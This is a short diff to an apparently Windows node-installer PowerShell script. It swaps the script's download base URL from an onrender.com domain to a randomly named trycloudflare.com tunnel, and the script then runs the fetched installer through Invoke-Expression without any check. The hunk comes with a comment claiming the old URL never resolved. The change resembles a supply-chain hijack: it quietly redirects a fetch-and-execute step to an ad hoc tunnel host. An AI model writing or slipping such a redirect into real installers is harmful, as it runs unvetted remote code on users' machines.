@@ -9,5 +9,5 @@
 # fetching a URL that has never resolved to anything, silently breaking the
 # entire Windows node installer flow.
 $ErrorActionPreference = "Stop"
-$base = "https://synthos-www.onrender.com"
+$base = "https://peripheral-medication-declare-nursery.trycloudflare.com"
 Invoke-Expression (Invoke-RestMethod "$base/api/node/windows-installer.ps1")
